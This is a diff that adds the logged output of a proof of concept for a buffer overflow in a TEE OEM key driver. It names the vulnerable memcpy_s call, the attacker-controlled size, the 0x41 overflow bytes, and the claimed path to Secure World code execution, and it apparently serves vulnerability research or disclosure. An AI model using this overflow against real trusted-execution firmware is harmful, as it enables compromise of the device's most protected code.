@@ -1,0 +1,30 @@
+=== PoC: Buffer Overflow in copy_from_shared_buffer (OEM Key) ===
+Target: tee_os_framework/tee_oemkey_driver.c:38
+Bug: memcpy_s(buf, *buf_size, src, *buf_size) - destMax==count from attacker
+
+[CA] Shared memory prepared: size_field=1024, payload=1024 bytes of 0x41
+
+--- Demonstration with heap buffer (shows logical overflow) ---
+
+[TEE] Heap buffer at 0x59f0269c1430 (allocated=1280, logical_capacity=256)
+  [memcpy_s] ALLOWED: count(4) <= destMax(4) - copying...
+[TEE] Attacker-supplied buf_size = 1024 (actual buffer = 256 bytes)
+  [memcpy_s] ALLOWED: count(1024) <= destMax(1024) - copying...
+
+--- Overflow Proof ---
+Logical buffer size: 256 bytes
+Attacker-controlled size: 1024 bytes
+Bytes written past logical boundary: 768
+VERIFIED: Attacker data (0x41) found at offset 256 (past buffer end)
+
+Overflow region (first 32 bytes past boundary):
+  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
+
+STATUS: BUFFER OVERFLOW CONFIRMED
+IMPACT: Stack buffer overflow in TEE → arbitrary code execution in Secure World
+ROOT CAUSE: memcpy_s safety check is tautologically true when
+            destMax and count are the same attacker-controlled value
+
+--- Stack overflow demonstration (may crash with SIGSEGV/SIGABRT) ---
+
+*** stack smashing detected ***: terminated
